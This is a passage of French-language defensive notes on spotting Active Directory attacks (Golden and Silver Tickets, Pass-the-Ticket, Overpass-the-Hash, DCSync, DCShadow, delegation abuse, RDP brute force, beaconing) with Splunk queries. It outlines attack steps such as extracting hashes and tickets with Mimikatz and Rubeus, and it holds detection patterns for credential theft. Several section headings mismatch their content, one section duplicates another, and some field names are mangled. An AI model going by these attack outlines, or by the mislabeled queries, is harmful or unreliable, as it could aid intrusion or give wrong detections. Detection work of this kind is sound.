Utiliser des scripts PowerShell pour détecter les réponses inattendues LLMNR ou NBT-NS.
Exemple de script PowerShell pour la détection :

New-EventLog -LogName Application -Source LLMNRDetection
Write-EventLog -LogName Application -Source LLMNRDetection -EventId 19001 -Message $msg -EntryType Warning
Détection des attaques de type Responder avec Splunk
Plage horaire :
Le plus tôt : 1690290078
Le plus tard : 1690291207
Requêtes Splunk
Détection des alertes LLMNR :

index=main earliest=1690290078 latest=1690291207 SourceName=LLMNRDetection
| table time, ComputerName, SourceName, Message
Suivi des requêtes DNS (Sysmon Event ID 22) :

index=main earliest=1690290078 latest=1690291207 EventCode=22 
| table time, Computer, user, Image, QueryName, QueryResults
Event ID 4648 - Connexions explicites vers des partages malveillants :

index=main earliest=1690290814 latest=1690291207 EventCode IN (4648) 
| table time, EventCode, source, name, user, TargetServerName, Message
| sort 0 time
Ces requêtes aident à suivre les activités suspectes liées aux requêtes LLMNR, NBT-NS et DNS, permettant ainsi une détection précoce des attaques de poisoning et des tentatives de vol de crédentiels.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Kerberoasting &amp; AS-REProasting</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8074-b151-cf65a4e3de87"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">E. Détection de Golden Ticket via Splunk

Cette requête Splunk permet de détecter une activité suspecte liée à des Golden Tickets, en identifiant les demandes de tickets de service (TGS) qui ne sont pas précédées par les étapes classiques d’authentification Kerberos (AS-REQ / AS-REP). Ce type de comportement peut indiquer l’utilisation d’un TGT forgé par un attaquant.

Requête Splunk

index="goldenticketattack" sourcetype="bro:kerberos:json"
| where client!="-"
| bin time span=1m
| stats count as totalrequests, values(client), values(requesttype) as requesttypes, dc(requesttype) as uniquerequesttypes by time, id.origh, id.resph
| where totalrequests &gt; 10 AND uniquerequesttypes==1 AND mvcount(requesttypes)==1 AND mvindex(requesttypes,0)=="TGS"
Explication de la requête
Sélection des données
index="goldenticketattack" : Recherche dans l’index dédié à la détection des attaques Golden Ticket.
sourcetype="bro:kerberos:json" : Utilise les logs Kerberos fournis par Zeek/Bro au format JSON.
Filtrage du client
where client!="-” : Écarte les événements où le champ client est vide ou absent.
Regroupement temporel
bin time span=1m : Regroupe les événements par minute pour détecter des rafales de requêtes suspectes.
Agrégation
stats count as totalrequests : Nombre total de requêtes par groupe.
values(requesttype) : Types de requêtes observés (ex. TGS, AS-REQ).
dc(requesttype) : Nombre de types distincts de requêtes.
id.origh / id.resph : IP source (client) et IP destination (souvent le contrôleur de domaine).
Filtrage comportemental
totalrequests &gt; 10 : Se concentre sur les clients envoyant beaucoup de requêtes dans un court laps de temps.
uniquerequesttypes == 1 et requesttypes == "TGS" : Signale les cas où seule la demande de TGS est présente, sans trace d’AS-REQ/AS-REP.

Interprétation
Un client qui envoie uniquement des requêtes de type TGS sans aucune authentification préalable est hautement suspect. Cela peut signifier que l’attaquant a injecté un Golden Ticket, lui permettant d’accéder directement aux services sans s’authentifier auprès du KDC.

À investiguer
Adresse IP source (id.origh) : Est-ce une machine autorisée ?
Fréquence : Ce comportement se répète-t-il dans plusieurs intervalles ?
IP destination (id.resp_h) : Correspond-elle à un contrôleur de domaine ?
Client ou utilisateur : S’agit-il d’un service connu ou d’un compte anormal ?</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Pass-the-Hash</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-808a-b87f-e4f20e96ea7b"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Aperçu de l'attaque Overpass-the-Hash (Pass-the-Key)

Overpass-the-Hash (Pass-the-Key) permet aux attaquants de s'authentifier via Kerberos en utilisant des hashs de mots de passe volés, leur permettant ainsi de demander des TGT (Ticket Granting Ticket) Kerberos et d'obtenir un accès non autorisé aux systèmes sans avoir recours à NTLM.
Étapes de l'attaque
Extraction des hash des utilisateurs : L'attaquant utilise des outils comme Mimikatz pour obtenir le hash NTLM d'un utilisateur connecté, nécessitant des privilèges d'administrateur local.
Demande de TGT avec Rubeus : L'attaquant utilise Rubeus pour créer une requête brute AS-REQ pour un TGT d'un utilisateur spécifié. Cette étape ne nécessite pas de privilèges élevés, la rendant plus discrète.
Soumission du Ticket : L'attaquant injecte le TGT demandé dans la session en cours, de manière similaire à l'attaque Pass-the-Ticket, pour effectuer des mouvements latéraux.

Opportunités de détection de l'attaque Overpass-the-Hash
Logique de détection clé
Détection de Mimikatz : Les artefacts d'attaques Overpass-the-Hash basées sur Mimikatz ressemblent à ceux des attaques Pass-the-Hash et peuvent être détectés à l'aide de techniques similaires.
Détection de Rubeus : Lorsque Rubeus envoie une requête AS-REQ directement au contrôleur de domaine via le port TCP/UDP 88, cela génère l'Event ID 4768. Cependant, des processus inhabituels communiquant sur le port 88 vers le contrôleur de domaine, autre que lsass.exe, peuvent aider à identifier l'activité potentielle d'Overpass-the-Hash.

Exemple de requête Splunk : Détection de Rubeus dans l'attaque Overpass-the-Hash

Description : Cette requête identifie les requêtes AS-REQ envoyées sur le port 88 provenant de processus inhabituels, en recherchant spécifiquement l'Event ID 3 avec un port de destination égal à 88, tout en excluant lsass.exe.

Plage horaire : earliest=1690443407 latest=1690443544

index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 destport=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by processid
| where EventCode=3
| stats count by time, Computer, destip, destport, Image, process
| fields - count
Explication des composants clés de la requête
Filtrage des événements :
Sélection de la source : Filtre les événements provenant du journal opérationnel de Sysmon (XmlWinEventLog:Microsoft-Windows-Sysmon/Operational).
EventCode 3 : Capture les connexions réseau effectuées par l'hôte, ciblant spécifiquement le trafic vers destport=88 (Kerberos), en excluant Image=lsass.exe, car il s'agit d'un processus légitime accédant aux services Kerberos.
OR EventCode 1 : Capture tous les événements de création de processus pour permettre une corrélation avec d'autres événements liés aux processus suspects.
Statistiques des événements :
EventStats : Ajoute la liste des processus pour chaque identifiant de processus (processid), stockée sous process.
Where EventCode=3 : Filtre pour les événements de connexion réseau sur le port 88.
Agrégation et filtrage :
Stats count by Fields : Agrège les événements par time, Computer, destip, destport, Image, et process, tout en calculant le nombre d’occurrences (count).
Fields - count : Supprime le champ count du résultat final pour plus de clarté.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Pass-the-Ticket</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8076-ab05-c7f72eadbb99"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Aperçu de l'attaque Pass-the-Ticket (PtT)

Pass-the-Ticket (PtT) est une technique permettant aux attaquants de se déplacer latéralement dans un réseau en utilisant des tickets Kerberos au lieu de mots de passe. Avec des privilèges administratifs, un attaquant peut extraire des tickets Kerberos valides (TGT ou TGS) de la mémoire d'un système compromis et les utiliser pour accéder à des ressources sans avoir besoin du mot de passe de l'utilisateur.
Étapes de l'attaque Pass-the-Ticket :
Extraction des tickets Kerberos : L'attaquant utilise des outils comme Mimikatz pour extraire des tickets TGT ou TGS d'un système compromis.
Authentification avec le ticket extrait : L'attaquant soumet le ticket dans la session de connexion en cours, s'authentifiant en tant qu'utilisateur sans avoir besoin du mot de passe.
Mouvement latéral : En utilisant le ticket, l'attaquant peut accéder à des systèmes ou ressources supplémentaires sur le réseau.
Processus d'authentification Kerberos &amp; événements de sécurité associés à Windows
Event ID 4624 : Connexion réussie à un système.
Event ID 4648 : Tentative de connexion explicite avec des informations d'identification.
Event ID 4672 : Connexion spéciale, indiquant des privilèges administratifs.
Event ID 4768 : Demande de TGT dans le processus Kerberos.
Event ID 4769 : Demande de TGS dans le processus Kerberos.
Event ID 4770 : Renouvellement de ticket TGS.
Opportunités de détection de l'attaque Pass-the-Ticket
Logique clé de détection

La détection des attaques PtT nécessite de surveiller les demandes de tickets de service Kerberos (TGS) émises sans une demande préalable de TGT. Les attaquants peuvent importer un TGT directement dans une session, créant ainsi un écart où une demande de TGS (Event ID 4769) ou un renouvellement de ticket (Event ID 4770) n'a pas de demande TGT associée (Event ID 4768). Surveiller les incohérences dans le processus d'authentification peut permettre de repérer les tentatives PtT.

Exemple 1 : Détection des demandes de tickets TGS sans demande préalable de TGT

Description : Cette requête recherche les demandes de tickets de service Kerberos (4769) et les renouvellements (4770) sans demande préalable de TGT (4768) provenant du même système, ce qui peut indiquer un TGT importé.

Plage horaire : earliest=1690392405 latest=1690451745

index=main earliest=1690392405 latest=1690451745 source="WinEventLog:Security" user!=$ EventCode IN (4768,4769,4770)
| rex field=user "(?&lt;username&gt;[^@]+)"
| rex field=srcip "(\:\:ffff\:)?(?&lt;srcip4&gt;[0-9\.]+)"
| transaction username, srcip4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closedtxn=0
| search NOT user="$@"
| table time, ComputerName, username, srcip4, servicename, category
Explication des composants clés
Filtrage des événements :
Sélection des événements : Filtre les événements pour inclure uniquement les Event IDs 4768, 4769 et 4770 dans le journal de sécurité, en excluant les comptes machines (user!=$).
Expressions régulières :
Extraction du nom d'utilisateur : Extrait le nom d'utilisateur du champ user pour une identification plus facile.
Extraction de l'IP : Extrait les adresses IPv4 de srcip, en tenant compte des adresses IPv6 mappées sur IPv4 en se concentrant sur la portion IPv4.
Commande transaction :
But : Groupe les événements associés par username et srcip4, en commençant avec EventCode 4768 (demande de TGT).
Paramètres : maxspan=10h définit une fenêtre de transaction maximale de 10 heures, permettant des sessions de connexion longues ; keepevicted=true garantit que les transactions ouvertes restent visibles.
Filtrage pour transactions ouvertes :
closed\txn=0 : Filtre les transactions sans événement de clôture, ce qui montre les cas où des tickets TGS ou des renouvellements ont été demandés sans une demande de TGT préalable.
Affichage des résultats :
Affiche des champs pertinents comme time, ComputerName, username, srcip4, servicename, et category pour faciliter l'analyse.

Exemple 2 : Détection des demandes TGS et comportements anormaux

Dans les cas où des attaquants importent des tickets TGS sans demande TGT valide, des anomalies peuvent apparaître dans Event ID 4771 (Échec de pré-authentification). En surveillant les incohérences dans les codes d'échec et les types d'authentification, des attaques PtT supplémentaires peuvent être détectées.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Overpass-the-Hash </strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80fb-ac1f-fddb988234dd"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Aperçu de l'attaque Overpass-the-Hash (Pass-the-Key)

Overpass-the-Hash (Pass-the-Key) permet aux attaquants de s'authentifier via Kerberos en utilisant des hashs de mots de passe volés, leur permettant ainsi de demander des TGT (Ticket Granting Ticket) Kerberos et d'obtenir un accès non autorisé aux systèmes sans avoir recours à NTLM.
Étapes de l'attaque
Extraction des hash des utilisateurs : L'attaquant utilise des outils comme Mimikatz pour obtenir le hash NTLM d'un utilisateur connecté, nécessitant des privilèges d'administrateur local.
Demande de TGT avec Rubeus : L'attaquant utilise Rubeus pour créer une requête brute AS-REQ pour un TGT d'un utilisateur spécifié. Cette étape ne nécessite pas de privilèges élevés, la rendant plus discrète.
Soumission du Ticket : L'attaquant injecte le TGT demandé dans la session en cours, de manière similaire à l'attaque Pass-the-Ticket, pour effectuer des mouvements latéraux.

Opportunités de détection de l'attaque Overpass-the-Hash
Logique de détection clé
Détection de Mimikatz : Les artefacts d'attaques Overpass-the-Hash basées sur Mimikatz ressemblent à ceux des attaques Pass-the-Hash et peuvent être détectés à l'aide de techniques similaires.
Détection de Rubeus : Lorsque Rubeus envoie une requête AS-REQ directement au contrôleur de domaine via le port TCP/UDP 88, cela génère l'Event ID 4768. Cependant, des processus inhabituels communiquant sur le port 88 vers le contrôleur de domaine, autre que lsass.exe, peuvent aider à identifier l'activité potentielle d'Overpass-the-Hash.

Exemple de requête Splunk : Détection de Rubeus dans l'attaque Overpass-the-Hash

Description : Cette requête identifie les requêtes AS-REQ envoyées sur le port 88 provenant de processus inhabituels, en recherchant spécifiquement l'Event ID 3 avec un port de destination égal à 88, tout en excluant lsass.exe.

Plage horaire : earliest=1690443407 latest=1690443544

index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 destport=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by processid
| where EventCode=3
| stats count by time, Computer, destip, destport, Image, process
| fields - count
Explication des composants clés de la requête
Filtrage des événements :
Sélection de la source : Filtre les événements provenant du journal opérationnel de Sysmon (XmlWinEventLog:Microsoft-Windows-Sysmon/Operational).
EventCode 3 : Capture les connexions réseau effectuées par l'hôte, ciblant spécifiquement le trafic vers destport=88 (Kerberos), en excluant Image=lsass.exe, car il s'agit d'un processus légitime accédant aux services Kerberos.
OR EventCode 1 : Capture tous les événements de création de processus pour permettre une corrélation avec d'autres événements liés aux processus suspects.
Statistiques des événements :
EventStats : Ajoute la liste des processus pour chaque identifiant de processus (processid), stockée sous process.
Where EventCode=3 : Filtre pour les événements de connexion réseau sur le port 88.
Agrégation et filtrage :
Stats count by Fields : Agrège les événements par time, Computer, destip, destport, Image, et process, tout en calculant le nombre d’occurrences (count).
Fields - count : Supprime le champ count du résultat final pour plus de clarté.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Golden Tickets and Silver Tickets</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-806e-8d28-e7f298065107"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Golden Ticket

Une attaque Golden Ticket consiste à forger un Ticket Granting Ticket (TGT) pour usurper l’identité d’un administrateur de domaine et accéder librement à l’ensemble du domaine. Cette attaque est difficile à détecter, car le ticket généré est techniquement valide et peut être créé hors ligne par un attaquant.
Étapes de l’attaque
Extraction du hash KRBTGT : L’attaquant récupère le hash NTLM du compte KRBTGT, souvent via une attaque DCSync ou en extrayant les fichiers NTDS.dit et LSASS.
Création du TGT falsifié : À l’aide de ce hash, l’attaquant forge un TGT lui attribuant des privilèges d’administrateur du domaine.
Injection du TGT : Ce ticket est injecté dans une session utilisateur, permettant un accès non autorisé aux ressources du domaine.
Opportunités de détection

La détection repose sur certains indicateurs tels que :
Activité DCSync suspecte : surveiller les requêtes DCSync non légitimes.
Accès à NTDS.dit ou LSASS : l’événement Sysmon ID 10 peut alerter sur un accès à LSASS pour l’extraction de hash.
Alertes Pass-the-Ticket : l’utilisation d’un Golden Ticket ressemble à des comportements Pass-the-Ticket.

Exemple de requête Splunk : Détection d’un Golden Ticket

Description : Cette recherche identifie l’utilisation potentielle d’un Golden Ticket en détectant des tickets Kerberos (4769 ou 4770) qui n’ont pas d’événement initial 4768 (AS-REQ), ce qui peut indiquer qu’ils ont été forgés.

Plage temporelle : earliest=1690451977 latest=1690452262

index=main earliest=1690451977 latest=1690452262 source="WinEventLog:Security" user!=$ EventCode IN (4768,4769,4770)
| rex field=user "(?&lt;username&gt;[^@]+)"
| rex field=srcip "(\:\:ffff\:)?(?&lt;srcip4&gt;[0-9\.]+)"
| transaction username, srcip4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closedtxn=0
| search NOT user="$@*"
| table time, ComputerName, username, srcip4, servicename, category
Silver Ticket

Une attaque Silver Ticket permet de forger des tickets de service (TGS) pour accéder à des services spécifiques (par exemple, SQL Server) sans authentification complète auprès du contrôleur de domaine. Elle donne un accès plus limité que le Golden Ticket mais reste redoutable.
Étapes de l’attaque
Extraction du hash du compte de service : L’attaquant récupère le hash NTLM d’un compte de service cible.
Création d’un TGS falsifié : Il forge un ticket de service avec ce hash.
Injection et accès : Le ticket est injecté dans une session pour accéder au service visé.
Opportunités de détection

Les indicateurs clés incluent :
Création de nouveaux comptes utilisateurs : l’événement ID 4720 peut alerter sur des comptes récemment créés.
Attribution de privilèges spéciaux : l’événement ID 4672 permet de détecter des connexions avec des droits élevés.

Exemples de requêtes Splunk pour détecter les Silver Tickets
Requête 1 : Comparaison entre utilisateurs créés et utilisateurs connectés

Objectif : Identifier les comptes utilisateurs récemment créés qui se connectent sans être attendus.

Extraction des utilisateurs créés :

index=main latest=1690448444 EventCode=4720
| stats min(time) as time, values(EventCode) as EventCode by user
| outputlookup users.csv
Comparaison avec les connexions récentes :

Plage temporelle : latest=1690545656

index=main latest=1690545656 EventCode=4624
| stats min(time) as firstTime, values(ComputerName) as ComputerName, values(EventCode) as EventCode by user
| eval last24h = 1690451977
| where firstTime &gt; last24h
| convert ctime(firstTime)
| convert ctime(last24h)
| lookup users.csv user as user OUTPUT EventCode as Events
| where isnull(Events)
Requête 2 : Détection de privilèges spéciaux sur des connexions récentes

Objectif : Identifier des comptes ayant obtenu des privilèges élevés récemment, possiblement via un Silver Ticket.

Plage temporelle : latest=1690545656

index=main latest=1690545656 EventCode=4672
| stats min(time) as firstTime, values(ComputerName) as ComputerName by AccountName
| eval last24h = 1690451977
| where firstTime &gt; last24h
| table firstTime, ComputerName, AccountName
| convert ctime(firstTime)
Résumé

Les attaques Golden Ticket et Silver Ticket tirent parti des failles du protocole Kerberos pour obtenir un accès non autorisé à un environnement Active Directory. La détection repose sur la corrélation d’événements liés aux connexions, à la création de comptes et à l’élévation de privilèges. L’utilisation de Splunk pour surveiller ces indicateurs permet aux équipes de sécurité de repérer et de réagir plus efficacement à ces menaces avancées.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Unconstrained Delegation and Constrained Delegation Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-809a-828c-d95f8103505c"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Délégation non contrainte

La délégation non contrainte permet à un service de s'authentifier auprès d'autres ressources au nom de n'importe quel utilisateur, exposant ainsi des données sensibles en cas de compromission. Les attaquants peuvent exploiter cette vulnérabilité pour extraire les tickets TGT de la mémoire et se déplacer latéralement dans le réseau.
Étapes de l'attaque :
Identifier les systèmes avec la délégation non contrainte activée.
Accéder à un système vulnérable.
Extraire les TGT à l’aide d’outils comme Mimikatz.
Opportunités de détection :
Commandes PowerShell : La surveillance des journaux PowerShell (Event ID 4104) peut révéler des commandes liées à la découverte de la délégation non contrainte.
Requêtes LDAP : Analyser les journaux pour détecter des requêtes LDAP concernant les paramètres de délégation.
Réutilisation de TGT : Les détections Pass-the-Ticket peuvent signaler l’utilisation des TGT.
Exemple de requête Splunk :

index=main earliest=1690544538 latest=1690544540 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 Message="TrustedForDelegation" OR Message="userAccountControl:1.2.840.113556.1.4.803:=524288" 
| table time, ComputerName, EventCode, Message
Délégation contrainte

La délégation contrainte restreint la délégation à des services spécifiques, permettant à un service d'agir au nom d'un utilisateur uniquement pour des ressources définies. Cependant, des attaquants peuvent exploiter cette fonctionnalité via les extensions S4U pour s’impliquer dans des attaques de type Pass-the-Ticket.
Étapes de l'attaque :
Identifier les comptes avec msDS-AllowedToDelegateTo.
Extraire le TGT d’un principal.
Utiliser les techniques S4U2self et S4U2proxy pour imiter des comptes privilégiés.
Accéder aux ressources en tant qu'utilisateur cible.
Opportunités de détection :
Requêtes LDAP et PowerShell : Surveiller les commandes qui recherchent msDS-AllowedToDelegateTo.
Trafic Kerberos : Analyser le trafic inhabituel sur le port 88 (Kerberos).
Exemple de requête Splunk pour la découverte de la délégation contrainte via PowerShell :

index=main earliest=1690544553 latest=1690562556 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 Message="msDS-AllowedToDelegateTo" 
| table time, ComputerName, EventCode, Message
Exemple de requête Splunk pour la détection avec les logs Sysmon :

index=main earliest=1690562367 latest=1690562556 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
| eventstats values(process) as process by processid
| where EventCode=3 AND destport=88
| table time, Computer, destip, dest_port, Image, process</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting DCSync &amp; DCShadow</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80da-be5d-f82ee85d7302"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">DCSync

DCSync est une technique permettant à un attaquant d’imiter un contrôleur de domaine pour obtenir les données de réplication d’Active Directory, notamment les hashs de mots de passe (actuels et anciens). Cette attaque peut ensuite servir à :
Forger des Golden Tickets ou Silver Tickets
Réaliser des attaques de type Pass-the-Hash
Étapes de l'attaque
Accès Administratif : L’attaquant obtient un accès administrateur sur une machine liée au domaine ou élève ses privilèges.
Demande de Réplication : À l’aide d’outils comme Mimikatz, l’attaquant utilise l’interface DRSGetNCChanges pour demander la réplication.
Exploitation des Hashs : Les données extraites sont utilisées pour forger des tickets Kerberos ou compromettre d’autres comptes.
Opportunités de détection
Événement Windows ID 4662 : Enregistre les opérations de type DS-Replication-Get-Changes, essentielles pour détecter les activités DCSync.
Configuration de l'audit : L'audit avancé des accès au service d'annuaire doit être activé (désactivé par défaut).

Requête Splunk – Détection de DCSync (Event ID 4662)

Description : Cette requête détecte les tentatives de réplication en recherchant la propriété "Replicating Directory Changes" dans les événements 4662.

Plage temporelle : earliest=1690544278 latest=1690544280

index=main earliest=1690544278 latest=1690544280 EventCode=4662 Message="Replicating Directory Changes"
| rex field=Message "(?P&lt;property&gt;Replicating Directory Changes.)"
| table time, user, objectfilename, ObjectServer, property
DCShadow

DCShadow est une attaque plus avancée permettant à un attaquant de créer des modifications non autorisées dans Active Directory sans générer de journaux standard. Cela implique de créer un faux contrôleur de domaine (rogue DC) qui réplique des changements malveillants vers les vrais contrôleurs de domaine.
Étapes de l'attaque
Accès élevé : L’attaquant doit posséder des privilèges suffisants pour inscrire un contrôleur de domaine.
Enregistrement du DC rogue : Un faux contrôleur de domaine est inscrit et effectue des modifications AD (par exemple, ajouter un utilisateur au groupe "Domain Admins").
Réplication des modifications : Ces modifications sont propagées via le mécanisme de réplication AD.
Opportunités de détection
Événement ID 4742 : Enregistre les modifications des objets ordinateurs, y compris les changements de ServicePrincipalName (SPN).
Création d’un objet nTDSDSA : Un ajout d’objet nTDSDSA dans le schéma AD est souvent un indicateur d’une activité DCShadow.

Requête Splunk – Détection de DCShadow (Event ID 4742)

Description : Cette requête détecte les modifications suspectes des comptes ordinateurs via des changements sur les ServicePrincipalNames, liés à l'activité DCShadow.

Plage temporelle : earliest=1690623888 latest=1690623890

index=main earliest=1690623888 latest=1690623890 EventCode=4742 
| rex field=Message "(?P&lt;gcspn&gt;XX\/[a-zA-Z0-9\.\-\/]+)" 
| table time, ComputerName, SecurityID, Account_Name, user, gcspn 
| search gcspn=
Résumé

Les attaques DCSync et DCShadow représentent des menaces sérieuses dans un environnement Active Directory. Leur détection repose sur la surveillance d'événements précis (comme les ID 4662 et 4742) et la corrélation de comportements anormaux sur les objets du domaine.

En mettant en place des politiques d’audit avancées et en exploitant des requêtes Splunk bien ciblées, les équipes de sécurité peuvent significativement améliorer leurs capacités de détection et de réponse face à ces techniques furtives.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Creating Custom Splunk Applications</summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80cd-9ba7-d433e90f3be9"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Création d’une application personnalisée dans Splunk
Étape 1 : Accéder à Splunk Web
Ouvrez votre navigateur web et connectez-vous à Splunk Web.
Étape 2 : Accéder à la gestion des applications
Dans le menu Applications en haut de la page, cliquez sur Gérer les applications.
Étape 3 : Créer une nouvelle application
Sur la page des applications, cliquez sur Créer une application.
Remplissez les champs suivants :
Nom : Entrez le nom de l’application, par exemple Détection d'attaques Active Directory.
Nom du dossier : Indiquez un nom similaire, par exemple ADAttackDetection. Ce dossier sera créé sous $SPLUNKHOME/etc/apps/.
Version : Entrez la version initiale, par exemple 1.0.0.
Description : Ajoutez une brève description, par exemple Application de détection des attaques Active Directory.
Modèle : Choisissez barebones dans la liste déroulante.
Cliquez sur Enregistrer. L’application apparaîtra alors dans la liste des applications.

Comprendre la structure du répertoire

Après la création de l’application, accédez au dossier $SPLUNKHOME/etc/apps/ADAttackDetection. Vous y trouverez plusieurs sous-dossiers ayant chacun un rôle spécifique :
/bin : Contient les scripts personnalisés.
/default : Contient les fichiers de configuration par défaut, les vues, les tableaux de bord et la navigation.
/local : Contient les configurations personnalisées (modifications locales).
/metadata : Contient les fichiers relatifs aux permissions et métadonnées.

Modifier le fichier de navigation
Ouvrez le fichier $SPLUNKHOME/etc/apps/ADAttackDetection/default/data/ui/nav/default.xml avec un éditeur de texte.
Ce fichier XML définit la navigation de l’application. Chaque balise &lt;view&gt; représente une vue affichée dans la barre de navigation. Exemple :

&lt;nav searchview="search"&gt;
  &lt;view name="search" default='true' /&gt;
  &lt;view name="analyticsworkspace" /&gt;
  &lt;view name="datasets" /&gt;
  &lt;view name="reports" /&gt;
  &lt;view name="alerts" /&gt;
  &lt;view name="dashboards" /&gt;
&lt;/nav&gt;
search\view : Spécifie la vue par défaut.
default='true' : Définit la page d’accueil par défaut (ici, la recherche).

Créer un tableau de bord (Dashboard)
Dans votre application Splunk, allez dans Tableaux de bord.
Cliquez sur Créer un nouveau tableau de bord et renseignez :
Nom du tableau de bord : Par exemple Tableau de bord AD.
Description : (facultatif)
Permissions : Définissez-les selon vos besoins.
Type de tableau de bord : Choisissez Tableaux de bord classiques.
Configurez votre tableau de bord avec des panneaux (panels), des filtres, et une plage temporelle.
Pour faire référence à un champ d’entrée, utilisez des tokens : $nomduchamp$.
Emplacement des tableaux de bord

Les fichiers XML de configuration des tableaux de bord se trouvent dans :
&lt;CheminDeLApp&gt;/local/data/ui/views/nomdudashboard.xml.
Ajouter un tableau de bord à la navigation
Ouvrez à nouveau le fichier default.xml :
   $SPLUNKHOME/etc/apps/ADAttack_Detection/default/data/ui/nav/default.xml.
Ajoutez le nom du tableau de bord dans la section &lt;nav&gt; pour qu’il apparaisse dans la barre de navigation.

Redémarrer Splunk
Redémarrez Splunk pour que les modifications soient prises en compte et que le tableau de bord apparaisse dans la navigation de l’application.

Regrouper plusieurs tableaux de bord

Pour organiser vos tableaux de bord dans un groupe, utilisez la balise &lt;collection&gt; dans le fichier default.xml :

&lt;collection label="Tableaux de bord AD"&gt;
  &lt;view name="dashboard1" /&gt;
  &lt;view name="dashboard2" /&gt;
&lt;/collection&gt;
Mettre à jour une application existante

Pour mettre à jour votre application à partir d’un fichier préconfiguré :
Téléchargez le fichier Detection-of-Active-Directory-Attacks.tar.gz depuis la section des ressources.
Accédez à Applications → Gérer les applications, puis cliquez sur Installer une application à partir d’un fichier.
Sélectionnez le fichier, cochez Mettre à jour l’application pour écraser l’existante, puis cliquez sur Téléverser.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting RDP Brute Force Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-802c-b89f-e733b5ec9e58"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Détection des attaques RDP par brute force

Les attaques par brute force RDP impliquent des tentatives répétées de connexion à une session RDP, en exploitant des mots de passe faibles ou par défaut pour accéder aux systèmes. Ce guide décrit comment détecter ces attaques avec Splunk et les journaux Zeek.
Requête de détection

Cette requête Splunk analyse les journaux Zeek et identifie les adresses IP avec un grand nombre de tentatives de connexion RDP en peu de temps, ce qui peut indiquer une attaque par brute force.
Explication de la requête
Index et sourcetype :
Filtrage des données RDP brute force avec index="rdpbruteforce" et sourcetype="bro:rdp:json".
Binning du temps :
La commande bin regroupe les événements en intervalles de 5 minutes, facilitant la détection des pics de tentatives typiques des attaques par brute force.
Comptage et regroupement :
La commande stats compte les tentatives de connexion par adresse IP source (id.origh) et adresse IP de destination (id.resph) dans chaque période de 5 minutes.
Filtrage par seuil :
Le critère where count &gt; 30 filtre les événements où plus de 30 tentatives de connexion sont observées dans une fenêtre de 5 minutes, ce qui peut indiquer une activité de brute force.
Requête Splunk

index="rdpbruteforce" sourcetype="bro:rdp:json"
| bin time span=5m
| stats count values(cookie) by time, id.origh, id.resph
| where count &gt; 30
Interprétation des résultats
Événements avec un grand nombre de tentatives : Si une IP source (id.origh) a plus de 30 tentatives de connexion vers une IP de destination (id.resph) dans un intervalle de 5 minutes, cela peut indiquer une tentative de brute force.
Cookies de session : Plusieurs valeurs uniques de cookie indiquent des tentatives de connexion séparées, soutenant la détection de motifs de brute force.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">D<strong>etecting Beaconing Malware</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80f4-952e-c155928bb714"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d’ensemble

Les malwares utilisant des techniques de beaconing, comme Cobalt Strike dans sa configuration par défaut, communiquent avec leur serveur de Command &amp; Control (C2) à des intervalles réguliers. En surveillant les intervalles entre ces communications dans les journaux réseau (ici via Zeek), on peut identifier des comportements suspects.

Ce guide présente une requête Splunk permettant de détecter ces schémas de communication régulière dans le trafic HTTP.

Configuration de la requête de détection

Cette requête Splunk analyse les intervalles temporels dans le trafic HTTP pour identifier les connexions répétitives et régulières — caractéristiques du beaconing.
Explication de la requête
Filtrage des données pertinentes
index="cobaltstrikebeacon" et sourcetype="bro:http:json" ciblent les journaux HTTP de Zeek (au format JSON) associés au malware Cobalt Strike.
Tri chronologique des événements
sort 0 time trie les événements par ordre croissant de temps pour permettre des calculs temporels fiables.
Calcul des différences de temps
